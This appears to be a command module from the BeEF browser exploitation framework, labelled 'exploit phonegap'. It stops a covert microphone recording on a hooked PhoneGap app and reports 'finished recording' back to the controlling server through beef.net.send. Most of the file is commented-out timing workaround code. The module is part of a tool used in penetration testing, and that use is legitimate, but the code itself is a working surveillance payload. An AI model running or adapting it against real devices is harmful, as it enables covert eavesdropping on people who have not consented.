// 
// exploit phonegap
//
beef.execute(function() {
    m.stopRecord();
    // weirdly setTimeout and stopRecord don't seem to work together
    //milliseconds = "<%== @duration %>" * 1000;
    //setTimeout("m.stopRecord()", milliseconds);
    
    // so here is an ugly work around
    //start = new Date(); 
    //stop = start.getTime() + 5000; 
    //do { 
    //    current = new Date(); 
    //    current = current.getTime(); 
    //} while(current < stop) 
    //m.stopRecord();
    
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "finished recording");	
});
